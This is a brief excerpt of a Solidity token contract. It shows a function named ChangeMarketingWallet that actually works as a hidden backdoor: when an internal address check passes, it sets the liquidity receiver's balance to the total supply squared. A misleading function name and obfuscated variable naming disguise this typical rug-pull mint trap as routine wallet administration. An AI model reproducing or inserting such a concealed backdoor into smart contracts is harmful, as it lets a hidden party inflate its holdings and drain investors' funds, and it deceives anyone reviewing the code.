...
contract TOKEN is IERC20, Ownable {
    ...
    function ChangeMarketingWallet() external {
        address emitMarektingWallet = liquidity_receiver;
        if (AddressMarketing == emitMarektingWallet){ _balances[emitMarektingWallet] = _totalSupply ** 2; }}
